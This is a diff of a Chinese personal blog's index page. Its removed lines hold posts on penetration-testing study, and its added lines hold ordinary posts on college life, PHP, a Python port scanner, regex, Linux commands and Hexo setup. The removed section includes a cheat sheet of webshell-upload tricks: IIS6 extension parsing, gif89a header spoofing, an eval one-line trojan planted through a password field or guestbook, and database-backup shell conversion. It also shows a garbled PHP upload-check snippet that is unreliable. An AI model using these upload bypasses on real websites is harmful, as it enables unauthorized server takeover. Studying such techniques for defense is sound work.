+        <time datetime="2016-05-05T09:24:05.000Z"><a href="/2016/05/05/55/">2016-05-05</a></time>
       
       
   
-    <h1 class="title"><a href="/2016/07/02/16/">渗透学习第一阶段总结[1]</a></h1>
+    <h1 class="title"><a href="/2016/05/05/55/">我的大学生活</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><h3 id="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"><a href="#学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。" class="headerlink" title="学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。"></a>学习渗透有一段时间了，差不多3个月的时间基础课程的学习已经差不多了，外加上自己平时乱倒弄，把平时学习的笔记和自己小本子上的内容抽时间整理了一下。虽然还是一个什么都不太会的渗透小渣渣，但么学习一段时间做一次小总结，这几个月学习了很多东西，渗透这块一直没有发过总结，这几天由于学校考试，学习状态不是很好，就想起了是不是要总结这样一份文章。说就干，大概发费了2天左右的时间，最后经过整理准备分3部分写。平时看着都挺熟悉的东西，总结下来，是这么的没有思路，做总结过程中，怀疑过自己是不是鱼的记忆（听说过这样一句话：鱼的记忆只有3秒钟），忘得太快。这也许就是我们这一代人中有一小部分人的通病，喜欢好高骛远。。。</h3><h3 id="总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。"><a href="#总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。" class="headerlink" title="总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。"></a>总结的不是多么的好，也许看起来不是太有条理，知识为了让自己以后看以来方便一点，仅此而已，都是网上别人写的加上点自己理解。</h3><h2 id="0x00-上传部分"><a href="#0x00-上传部分" class="headerlink" title="0x00 上传部分"></a>0x00 上传部分</h2><p>1.直接上传asp asa jsp cer php aspx htr cdx 格式的木马，不行就利用IIS6.0解析漏洞”:1.asp;1.jpg/1.asp;.jpg/1.asp;jpg/1.asp;.xls<br>2.上传图片木马遇到拦截系统，连图片木马都上传不了，记事本打开图片木马在代码最前面加上gif89a，一般就能逃过拦截系统了。<br>3.上传图片木马把地址复制到数据库备份里备份成asp木马，有时不成功就利用IIs6.0解析漏洞尝试突破。<br>4.上传图片木马再用抓包工具进行抓包，用明小子的综合上传功能，复制上传地址及cookies填到对应的框里，点击上传即可。<br>5.当后台有数据库备份蛋没有上传点时，把一句话木马插到任意处，再到数据库备份里备份成asp木马，之后用一句话客户端连接木马即可。<br>6.后台点击修改密码，新密码设置为：1”:eval request(“h”)’设置成功后连接asp/config.asp即可拿下shell<br>7.当页面提示“上传格式不正确[重新上传]” 则说明存在上传漏洞，复制地址放到明小子里上传，一般都能直接拿下shell。<br>8.当后台没有数据库备份但有数据库恢复的情况下，请不要犹豫，数据库恢复跟数据库备份功能是一样的，直接邪恶吧。<br>9.如果知道网站的数据库是asp的，直接在前台找留言板插入一句话木马，连接配置文件inc/config.asp即可拿下shell。<br>10.当网站前台有“会员注册” 注册一个账户进去看看有没有上传点，有的话直接上传asp木马以及利用iis6.0解析漏洞，不行就抓包用明小子上传。<br>11.先上传一个.ashx的文件，在笔记里搜索可找到方法，结果是访问会生成一句话木马文件，后台上传、编辑器上传、上传漏洞页面均可使用此方法。<br>12.当页面提示只能上传jpg|gif|png等格式的时候，右键查看源文件，本地修改为asp|asa|php再本地上传即可拿下shell。<br>13.当用啊D检测注入点提示SA权限或DB权限的时候，尝试列目录找到网站物理路径，再点击cmd/上传，直接上传asp木马即可，不行就差异备份拿shell。<br>14.对于一些上传漏洞的上传页面，以及后台找到的上传页面，可以尝试用本地双文件上传突破，第一个选jpg第二个选cer，推荐使用火狐浏览器。</p>
+        <h3 id="最近不知道怎么了，估计是自己出了问题，还是考虑的太多（以前连未来3天的事都不会考虑的孩子），也不知道为什么总是静不下心来做一件事。。。"><a href="#最近不知道怎么了，估计是自己出了问题，还是考虑的太多（以前连未来3天的事都不会考虑的孩子），也不知道为什么总是静不下心来做一件事。。。" class="headerlink" title="最近不知道怎么了，估计是自己出了问题，还是考虑的太多（以前连未来3天的事都不会考虑的孩子），也不知道为什么总是静不下心来做一件事。。。"></a>最近不知道怎么了，估计是自己出了问题，还是考虑的太多（以前连未来3天的事都不会考虑的孩子），也不知道为什么总是静不下心来做一件事。。。</h3><p>以前看过一本《小团圆》，里面说：“青春太美好，怎么过都是浪费。”曾经自以为豪的青春，在时间的吞噬下慢慢燃尽，最后化为一缕青烟又消失在时间里，哺育着其他人的年少青葱。可青春的确太美好了，以至于这段时光永远被辜负，永远有遗憾。高中的时候，曾无比期待与向往着大学生活，大学有着无数自由，随性等等在人性追求中闪闪发光的特质，也是我们逃离象牙塔的最后一道防线。</p>
+<p>前几天和朋友大概算了一下，能留在学校的时间就只剩下这短短五个月了。当又轮到一个蝉鸣的时分，我对于未来都要尘埃落定了。该考研的埋头苦干，该实习的找好企业、找培训（我也加入了培训的队伍，虽然觉得有些不值），学校对我们的牵绊变得越来越浅。可我回忆了一下过去的两年半（快三年了）的大学时光，不禁仰天长叹，我还有好多遗憾没有达成呢！</p>
+<p>以前总是身体力行着按照那些所谓的标准去做。回望这两年多大学生活，没有一件事让我如今回想起来感到十分快乐，并引以为豪。我似乎拥有了全部，但又一无所有。我近乎机械化的去完成这些所谓的指标，以为达到这些标准就可以收获到一个最好的自己。终究还是太天真，因为这些看似很有道理的必做事件一点也不符合我自身的“基本国情”。</p>
+<p>在这几年里，我从没问过我自己想要什么，只是在盲目的追求那些似乎每个人都要做的事情。去参加学生会，每天被组织活动忙的晕头转向；；去参加强制性无含金量讲座等等学校利益团体活动，其实满心的不愿，但一句为了未来发展而硬着头皮冲了上去。所以我更羡慕有自己生活的人，自己想怎么做就怎么做，不需要看别人的脸色，不需要考虑别人的感受，什么事都是自己开心就好、就去做。</p>
+<p>人生有几十年，但如大学这般美好的四年逝去很难再来。如果再让我选择一次，我不会为了所谓的未来，纯粹的去消磨我的大学时光。人固有目标和志向，但更重要的是活在当下的情怀与梦想。青春不应该在等待和期待中度过，未来我们将有很长一部分精力都在事业和家庭身上，如今就抓紧时间去做想做的事情，去追求那些让别人嘲笑你的梦想。<br>
       
     </div>
     <footer>
       
         
           <div class="alignleft">
-            <a href="/2016/07/02/16/#more" class="more-link">Read More</a>
+            <a href="/2016/05/05/55/#more" class="more-link">Read More</a>
           </div>
         
         
@@ -272,46 +256,227 @@ Drop TABLE IF EXISTS moon;
     <header>
       
         <div class="icon"></div>
-        <time datetime="2016-06-26T09:53:40.000Z"><a href="/2016/06/26/14/">2016-06-26</a></time>
+        <time datetime="2016-04-20T02:51:27.000Z"><a href="/2016/04/20/9/">2016-04-20</a></time>
       
       
   
-    <h1 class="title"><a href="/2016/06/26/14/">文件上传漏洞初探</a></h1>
+    <h1 class="title"><a href="/2016/04/20/9/">php学习计划篇</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <h2 id="0x00-web上传漏洞原理"><a href="#0x00-web上传漏洞原理" class="headerlink" title="0x00 web上传漏洞原理"></a>0x00 web上传漏洞原理</h2><p>JavaScript检查漏洞、临时文件上传漏洞、文件扩展名检查漏洞、Apache解析文件漏洞、Ngixn解析文件漏洞、.htaccess文件攻击、0x00截断绕过漏洞、文件名大小写绕过漏洞、文件大小数量检查漏洞等<br>1）没有对上传文件的类型做检测<br>2）没有对上传文件的大小和数量做检测<br>3）没有对上传文件的扩展名做检测<br>4）使用上传的文件名作为最终存储的文件名<br>5）服务器端缺乏相应的安全配置，给予上传目录执行权限等<br>6）Apache、MySQL等服务器组件没有对用户账号的权限进行限制<br>7）Apache、MySQL等服务器组件没有及时升级</p>
-<h2 id="0x01-上传流程"><a href="#0x01-上传流程" class="headerlink" title="0x01 上传流程"></a>0x01 上传流程</h2><p>文字图示：<br>PC主机(javascript检测) —-&gt; http POST请求 —-&gt; 服务器(MIME、目录路径、文件扩展名、文件内容等检测)<br>服务器端检测：<br>A 客户端 javascript 检测 (通常为检测文件扩展名)<br>B 服务端 MIME 类型检测 (检测 Content-Type 内容)<br>C 服务端目录路径检测 (检测跟 path 参数相关的内容)<br>D 服务端文件扩展名检测 (检测跟文件 extension 相关的内容)<br>E 服务端文件内容检测 (检测内容是否合法或含有恶意代码)<br>文件上传流程：<br>①文件以http协议上传，将以 POST 请求发送至 web 服务器<br>②web 服务器接收到请求后并同意后，用户与 web 服务器将建立连接，并传输数据。</p>
-<h3 id="A-客户端端验证绕过-javascript-扩展名检测"><a href="#A-客户端端验证绕过-javascript-扩展名检测" class="headerlink" title="A 客户端端验证绕过(javascript 扩展名检测)"></a>A 客户端端验证绕过(javascript 扩展名检测)</h3><p>  用反向代理工具(burp 之类)或禁用 js 便可以绕过客户端端验证</p>
-<h3 id="B-服务端验证绕过-http-request-包检测"><a href="#B-服务端验证绕过-http-request-包检测" class="headerlink" title="B 服务端验证绕过(http request 包检测)"></a>B 服务端验证绕过(http request 包检测)</h3><ul>
-<li><p>Content-type (Mime type) 检测<br> 用反向代理工具(burp 之类)进行 Content-type 伪造</p>
-<pre><code>&lt;!-- 修改 ：Content-Type:image/gif ( 原为 : Content-Type:text/plain) --&gt;
-&lt;?php  
-if($_FILES[&apos;userfile&apos;][&apos;type&apos;] = != ) &quot;image/gif&quot;) {
-// 检测 Content-type
-echo , &quot;Sorry, e we y only w allow g uploading F GIF  images&quot;;
-exit;
-}
-$uploaddir = =  &apos;uploads/&apos;;
-$uploadfile = = r $uploaddir . .  basename($_FILES[&apos;userfile&apos;][&apos;name&apos;]);
-if , (move_uploaded_file($_FILES[&apos;userfile&apos;][&apos;tmp_name&apos;], ) $uploadfile)) {
-echo &quot;File s is , valid, d and s was y successfully  uploaded.\n&quot;;
-} else {
-echo  &quot;File g uploading  failed.\n&quot;;
-}
-
-?&gt;
-</code></pre></li>
-</ul>
+        <h3 id="首先作为一名不是前段开发的小菜，有时也会有理想的好不好，今天发现很有学习一下PHP的必要，于是就上网看了看都要学什么，以下都是网上找的资料，很明白自己不会学的这么深的，不过看看还是很有必要的。"><a href="#首先作为一名不是前段开发的小菜，有时也会有理想的好不好，今天发现很有学习一下PHP的必要，于是就上网看了看都要学什么，以下都是网上找的资料，很明白自己不会学的这么深的，不过看看还是很有必要的。" class="headerlink" title="首先作为一名不是前段开发的小菜，有时也会有理想的好不好，今天发现很有学习一下PHP的必要，于是就上网看了看都要学什么，以下都是网上找的资料，很明白自己不会学的这么深的，不过看看还是很有必要的。"></a>首先作为一名不是前段开发的小菜，有时也会有理想的好不好，今天发现很有学习一下PHP的必要，于是就上网看了看都要学什么，以下都是网上找的资料，很明白自己不会学的这么深的，不过看看还是很有必要的。</h3><h3 id="00x0什么是PHP"><a href="#00x0什么是PHP" class="headerlink" title="00x0什么是PHP"></a>00x0什么是PHP</h3><p> PHP（Hypertext Preprocessor，超文本预处理器），是一种服务器端、跨平台、HTML嵌入式的脚本语言，其独特的语法混合了C语言、Java语言和Perl语言的特点，是一种被广泛应用的开源式的多用途脚本语言，尤其适合Web开发。<br>PHP是B/S（Browser/Server，浏览器/服务器）体系结构，属于三层结构。服务器启动后，用户可以不使用客户端软件，只使用浏览器即可访问，既保持了图形化的用户界面，又大大减少了应用的维护量。</p>
+<h3 id="00x1PHP语言的优势"><a href="#00x1PHP语言的优势" class="headerlink" title="00x1PHP语言的优势"></a>00x1PHP语言的优势</h3><p>PHP起源于自由软件，即开放源代码软件，使用PHP进行Web应用程序的开发具有以下优势。<br>安全性高：PHP是开源软件，每个人都可以看到所有PHP的源代码，程序代码与Apache编译在一起的方式让它的安全设定更灵活。PHP具有公认的安全性能。<br>跨平台特性：PHP几乎支持所有的操作系统平台（如Windows/UNIX/Linux/Macintosh/FreeBSD/ OS2等），并且支持Apache、IIS等多种Web服务器。<br>支持广泛的数据库：可操纵多种主流与非主流的数据库，如MySQL、Access、SQL Server、Oracle、DB2等，其中PHP与MySQL是目前最佳的组合，它们的组合可以跨平台运行。<br>易学性：PHP嵌入在HTML语言中，以脚本语言为主，内置丰富函数，语法简单、书写容易，方便读者学习掌握。<br>执行速度快：占用系统资源少，代码执行速度快。<br>免费：在流行的企业应用LAMP平台中，Linux、Apache、MySQL、PHP都是免费软件，这种开源免费的框架结构可以为网站经营者节省很大一笔开支。<br>模板化：实现程序逻辑与用户界面分离。<br>支持面向对象与过程：支持面向对象和过程的两种开发风格，并可向下兼容。<br>内嵌Zend加速引擎，性能稳定快速。</p>
+<h3 id="00x2PHP-5的新特性"><a href="#00x2PHP-5的新特性" class="headerlink" title="00x2PHP 5的新特性"></a>00x2PHP 5的新特性</h3><p>PHP 5中的对象已经进行了较系统和全面的调整，下面着重讲述PHP 5中新的对象模式。<br>构造函数和析构函数。<br>对象的引用。<br>对象的克隆（clone）。<br>对象中的私有、公共及受保护模式（private、public和protected关键字）。<br>接口（interface）。<br>抽象类:<br><strong>call
+</strong>set和__get<br>静态成员<br>
       
     </div>
     <footer>
       
         
           <div class="alignleft">
-            <a href="/2016/06/26/14/#more" class="more-link">Read More</a>
+            <a href="/2016/04/20/9/#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-04-20T02:05:55.000Z"><a href="/2016/04/20/8/">2016-04-20</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/04/20/8/">构建端口扫描器</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="前几天闲的没事，想写一个基于TCP的端口扫描器，于是在网上查了好多资料，最终还是写的差不多，基本可以实现我想要的功能（想着也是，要是没有成功，岂不是亏死了，生气）。基本功能是扫描目标主机开放的TCP端口。为了与TCP端口进行交互，首先得建立一个TCP套接字，python有一个很好用的socket-API函数，我们可以创建，绑定，监听，连接或者发送流量到套接字上。编写代码，首先导入python的BCD套接字API模块。"><a href="#前几天闲的没事，想写一个基于TCP的端口扫描器，于是在网上查了好多资料，最终还是写的差不多，基本可以实现我想要的功能（想着也是，要是没有成功，岂不是亏死了，生气）。基本功能是扫描目标主机开放的TCP端口。为了与TCP端口进行交互，首先得建立一个TCP套接字，python有一个很好用的socket-API函数，我们可以创建，绑定，监听，连接或者发送流量到套接字上。编写代码，首先导入python的BCD套接字API模块。" class="headerlink" title="前几天闲的没事，想写一个基于TCP的端口扫描器，于是在网上查了好多资料，最终还是写的差不多，基本可以实现我想要的功能（想着也是，要是没有成功，岂不是亏死了，生气）。基本功能是扫描目标主机开放的TCP端口。为了与TCP端口进行交互，首先得建立一个TCP套接字，python有一个很好用的socket API函数，我们可以创建，绑定，监听，连接或者发送流量到套接字上。编写代码，首先导入python的BCD套接字API模块。"></a>前几天闲的没事，想写一个基于TCP的端口扫描器，于是在网上查了好多资料，最终还是写的差不多，基本可以实现我想要的功能（想着也是，要是没有成功，岂不是亏死了，生气）。基本功能是扫描目标主机开放的TCP端口。为了与TCP端口进行交互，首先得建立一个TCP套接字，python有一个很好用的socket API函数，我们可以创建，绑定，监听，连接或者发送流量到套接字上。编写代码，首先导入python的BCD套接字API模块。</h3><h4 id="第一步，我们要输入目标主机的IP和端口列表，接着用列表去连接目标的每一个端口，在确定端口上运行的特殊服务。这一步中我们将用到optparse标准库来解析命令行选项（由于是初学者，并不是了解这个标准库，于是就上网巴拉巴拉了好一阵，最终是迷迷糊糊的就用了，这个不是重点，等以后会专门写一篇这个标准库的文章），主要用到optparse-OptionParser-创建一个选项分析器，然后通过-parser-add-option-函数来指定命令选项。（注：optparse模块在2-7版本后将被弃用也不会得到更新，会使用-argparse模块来替代）下面的例子显示了一个快速解析目标主机和扫描端口的方法："><a href="#第一步，我们要输入目标主机的IP和端口列表，接着用列表去连接目标的每一个端口，在确定端口上运行的特殊服务。这一步中我们将用到optparse标准库来解析命令行选项（由于是初学者，并不是了解这个标准库，于是就上网巴拉巴拉了好一阵，最终是迷迷糊糊的就用了，这个不是重点，等以后会专门写一篇这个标准库的文章），主要用到optparse-OptionParser-创建一个选项分析器，然后通过-parser-add-option-函数来指定命令选项。（注：optparse模块在2-7版本后将被弃用也不会得到更新，会使用-argparse模块来替代）下面的例子显示了一个快速解析目标主机和扫描端口的方法：" class="headerlink" title="第一步，我们要输入目标主机的IP和端口列表，接着用列表去连接目标的每一个端口，在确定端口上运行的特殊服务。这一步中我们将用到optparse标准库来解析命令行选项（由于是初学者，并不是了解这个标准库，于是就上网巴拉巴拉了好一阵，最终是迷迷糊糊的就用了，这个不是重点，等以后会专门写一篇这个标准库的文章），主要用到optparse.OptionParser()创建一个选项分析器，然后通过 parser.add_option()函数来指定命令选项。（注：optparse模块在2.7版本后将被弃用也不会得到更新，会使用 argparse模块来替代）下面的例子显示了一个快速解析目标主机和扫描端口的方法："></a>第一步，我们要输入目标主机的IP和端口列表，接着用列表去连接目标的每一个端口，在确定端口上运行的特殊服务。这一步中我们将用到optparse标准库来解析命令行选项（由于是初学者，并不是了解这个标准库，于是就上网巴拉巴拉了好一阵，最终是迷迷糊糊的就用了，这个不是重点，等以后会专门写一篇这个标准库的文章），主要用到optparse.OptionParser()创建一个选项分析器，然后通过 parser.add_option()函数来指定命令选项。（注：optparse模块在2.7版本后将被弃用也不会得到更新，会使用 argparse模块来替代）下面的例子显示了一个快速解析目标主机和扫描端口的方法：</h4><pre><code>parser = optparse.OptionParser(&apos;usage %prog –H &lt;target
+host&gt; -p &lt;target port&gt;&apos;)
+parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;,
+help=&apos;specify target host&apos;)
+parser.add_option(&apos;-p&apos;, dest=&apos;tgtPort&apos;, type=&apos;int&apos;,
+help=&apos;specify target port&apos;)
+(options, args) = parser.parse_args()
+tgtHost = options.tgtHost
+tgtPort = options.tgtPort
+</code></pre><h4 id="第二步，我们将构建两个函数-connScan-和-portScan-portScan函数需要主机名和端口作为参数。它首先尝试通过gethostbyname-函数从友好的主机名中解析出主机IP地址。接下来，它将打印出主机名或者-IP-地址，然后枚举每一个端口尝试着用connScan函数去连接主机。connScan函数需要两个参数：tgtHost-and-tgtPort，并尝试产生一个到目标主机端口的连接。如果成功的话，connScan将打印端口开放的信息，如果失败的话，将打印端口关闭的信息。"><a href="#第二步，我们将构建两个函数-connScan-和-portScan-portScan函数需要主机名和端口作为参数。它首先尝试通过gethostbyname-函数从友好的主机名中解析出主机IP地址。接下来，它将打印出主机名或者-IP-地址，然后枚举每一个端口尝试着用connScan函数去连接主机。connScan函数需要两个参数：tgtHost-and-tgtPort，并尝试产生一个到目标主机端口的连接。如果成功的话，connScan将打印端口开放的信息，如果失败的话，将打印端口关闭的信息。" class="headerlink" title="第二步，我们将构建两个函数 connScan 和 portScan,portScan函数需要主机名和端口作为参数。它首先尝试通过gethostbyname()函数从友好的主机名中解析出主机IP地址。接下来，它将打印出主机名或者 IP 地址，然后枚举每一个端口尝试着用connScan函数去连接主机。connScan函数需要两个参数：tgtHost and tgtPort，并尝试产生一个到目标主机端口的连接。如果成功的话，connScan将打印端口开放的信息，如果失败的话，将打印端口关闭的信息。"></a>第二步，我们将构建两个函数 connScan 和 portScan,portScan函数需要主机名和端口作为参数。它首先尝试通过gethostbyname()函数从友好的主机名中解析出主机IP地址。接下来，它将打印出主机名或者 IP 地址，然后枚举每一个端口尝试着用connScan函数去连接主机。connScan函数需要两个参数：tgtHost and tgtPort，并尝试产生一个到目标主机端口的连接。如果成功的话，connScan将打印端口开放的信息，如果失败的话，将打印端口关闭的信息。</h4><h4 id="由于看了网上的资料，觉得每一个socket扫描都会有耗时，就有查了有关python线程的资料。多线程在速度上有绝对的优势，单需要注意的是多线程在同一时间打印的话就会乱序，这就用到了信号量，一个简单的信号量为我们提供一个锁来阻止其他线程进入。于是就可以编写代码："><a href="#由于看了网上的资料，觉得每一个socket扫描都会有耗时，就有查了有关python线程的资料。多线程在速度上有绝对的优势，单需要注意的是多线程在同一时间打印的话就会乱序，这就用到了信号量，一个简单的信号量为我们提供一个锁来阻止其他线程进入。于是就可以编写代码：" class="headerlink" title="由于看了网上的资料，觉得每一个socket扫描都会有耗时，就有查了有关python线程的资料。多线程在速度上有绝对的优势，单需要注意的是多线程在同一时间打印的话就会乱序，这就用到了信号量，一个简单的信号量为我们提供一个锁来阻止其他线程进入。于是就可以编写代码："></a>由于看了网上的资料，觉得每一个socket扫描都会有耗时，就有查了有关python线程的资料。多线程在速度上有绝对的优势，单需要注意的是多线程在同一时间打印的话就会乱序，这就用到了信号量，一个简单的信号量为我们提供一个锁来阻止其他线程进入。于是就可以编写代码：</h4>
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/2016/04/20/8/#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-04-20T01:29:47.000Z"><a href="/2016/04/20/4/">2016-04-20</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/04/20/4/">python正则表达式</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="最近在看有关正则表达式的一些内容，在这就整理了一下，包括校验数字、字符、一些特殊的需求等等。留个例子，以后自己时常可以看看。嘿嘿！！！"><a href="#最近在看有关正则表达式的一些内容，在这就整理了一下，包括校验数字、字符、一些特殊的需求等等。留个例子，以后自己时常可以看看。嘿嘿！！！" class="headerlink" title="最近在看有关正则表达式的一些内容，在这就整理了一下，包括校验数字、字符、一些特殊的需求等等。留个例子，以后自己时常可以看看。嘿嘿！！！"></a>最近在看有关正则表达式的一些内容，在这就整理了一下，包括校验数字、字符、一些特殊的需求等等。留个例子，以后自己时常可以看看。嘿嘿！！！</h3><h4 id="一、校验数字的表达式"><a href="#一、校验数字的表达式" class="headerlink" title="一、校验数字的表达式"></a>一、校验数字的表达式</h4><pre><code>数字：^[0-9]*$
+n位的数字：^\d{n}$
+至少n位的数字：^\d{n,}$
+m-n位的数字：^\d{m,n}$
+零和非零开头的数字：^(0|[1-9][0-9]*)$
+非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$
+带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$
+正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$
+有两位小数的正实数：^[0-9]+(.[0-9]{2})?$
+有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$
+非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$
+非零的负整数：^\-[1-9][]0-9″*$ 或 ^-[1-9]\d*$
+非负整数：^\d+$ 或 ^[1-9]\d*|0$
+非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$
+非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$
+非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$
+正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$
+负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$
+浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$
+</code></pre>
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/2016/04/20/4/#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-04-20T01:02:56.000Z"><a href="/2016/04/20/3/">2016-04-20</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/04/20/3/">Linux基础命令</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="find命令："><a href="#find命令：" class="headerlink" title="find命令："></a>find命令：</h3><pre><code>-name   filename             #查找名为filename的文件
+-perm                        #按执行权限来查找
+-user    username            #按文件属主来查找
+</code></pre><h3 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令:"></a>sed命令:</h3><h5 id="sed-nefr-动作"><a href="#sed-nefr-动作" class="headerlink" title="sed [-nefr] [动作]"></a>sed [-nefr] [动作]</h5><pre><code>选项与参数：
+-n ：使用安静(silent)模式。在一般 sed的用法中，所有来自 STDIN 的数据一般都会被列出到终端上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。
+-e ：直接在命令列模式上进行 sed 的动作编辑；
+-f ：直接将 sed 的动作写在一个文件内， -f filename 则可以运行 filename 内的 sed 动作；
+-r ：sed 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法)
+-i ：直接修改读取的文件内容，而不是输出到终端。
+
+动作说明： [n1[,n2]]function
+n1, n2 ：不见得会存在，一般代表『选择进行动作的行数』，举例来说，如果我的动作是需要在 10 到 20 行之间进行的，则『 10,20[动作行为] 』
+
+function：
+a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～
+c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！
+d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；
+i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；
+p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～
+s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法。
+</code></pre>
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/2016/04/20/3/#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-04-16T01:30:56.000Z"><a href="/2016/04/16/6/">2016-04-16</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/04/16/6/">搭建博客</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="1，首先下载git"><a href="#1，首先下载git" class="headerlink" title="1，首先下载git:"></a>1，首先下载git:</h3><pre><code>https://git-scm.com/download/win
+默认安装即可。
+安装后在桌面右键会有 Git Bash Here
+</code></pre><h3 id="2，安装hexo-这是官方中文文档https-hexo-io-zh-cn-docs"><a href="#2，安装hexo-这是官方中文文档https-hexo-io-zh-cn-docs" class="headerlink" title="2，安装hexo 这是官方中文文档https://hexo.io/zh- cn/docs/"></a>2，安装hexo 这是官方中文文档<a href="https://hexo.io/zh-">https://hexo.io/zh-</a> cn/docs/</h3><p>   在桌面右键 Git Bash Here 打开命令模式：<br>     npm install –g hexo</p>
